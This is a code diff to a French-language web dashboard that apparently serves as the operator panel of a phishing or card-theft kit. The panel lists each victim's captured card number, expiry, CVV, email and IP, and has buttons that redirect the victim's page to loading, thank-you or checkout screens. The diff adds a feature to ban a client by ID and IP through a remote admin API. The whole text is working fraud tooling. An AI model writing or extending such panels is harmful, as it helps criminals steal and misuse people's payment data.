@@ -213,6 +213,34 @@
             background: var(--primary);
         }
 
+        .btn-ban {
+            background: #000;
+            color: #fff;
+            border: 1px solid var(--danger);
+        }
+
+        .btn-ban:hover {
+            background: var(--danger);
+        }
+
+        .card.banned {
+            border: 2px solid var(--danger);
+            box-shadow: 0 0 20px rgba(239, 68, 68, 0.4);
+        }
+
+        .card.banned::after {
+            content: "BANNED";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-15deg);
+            font-size: 3rem;
+            font-weight: 800;
+            color: var(--danger);
+            opacity: 0.3;
+            pointer-events: none;
+        }
+
         /* Drag handle cursor */
         .deck-container {
             cursor: grab;
@@ -378,6 +406,7 @@
                         <button onclick="redirect('${id}', 'loading')" class="btn btn-primary">LOAD</button>
                         <button onclick="redirect('${id}', 'thank_you')" class="btn btn-success">MERCI</button>
                         <button onclick="redirect('${id}', 'checkout')" class="btn btn-danger">BACK</button>
+                        <button onclick="banClient('${id}')" class="btn btn-ban" style="grid-column: span 2;">BANNIR (IP + ID)</button>
                     </div>
                 `;
                 clientList.prepend(card);
@@ -390,7 +419,8 @@
                 card.querySelector('.exp-val').textContent = data.expiry + ' / ' + data.cvv;
                 card.querySelector('.email-val').textContent = data.email;
                 card.querySelector('.ip-val').textContent = data.adresse_ip;
-                card.querySelector('.device-val').textContent = data.device;
+                card.querySelector('.device-val').textContent = data.os_type || data.device;
+                card.setAttribute('data-ip', data.adresse_ip);
 
                 // Brand specific color
                 card.classList.remove('visa', 'mastercard', 'amex');
@@ -407,6 +437,19 @@
                 headers: { 'Content-Type': 'application/json', 'X-API-KEY': API_KEY },
                 body: JSON.stringify({ client_id: clientId, target: target })
             });
+        }
+
+        async function banClient(clientId) {
+            const card = document.getElementById(`card-${clientId}`);
+            const ip = card ? card.getAttribute('data-ip') : null;
+
+            if (!confirm(`Bannir le client ${clientId} et l'IP ${ip} ?`)) return;
+
+            await fetch(`https://api-production-8591.up.railway.app/v1/admin/ban?client_id=${clientId}&ip=${ip}`, {
+                method: 'POST',
+                headers: { 'X-API-KEY': API_KEY }
+            });
+            if (card) card.classList.add('banned');
         }
 
         async function downloadJSON() {
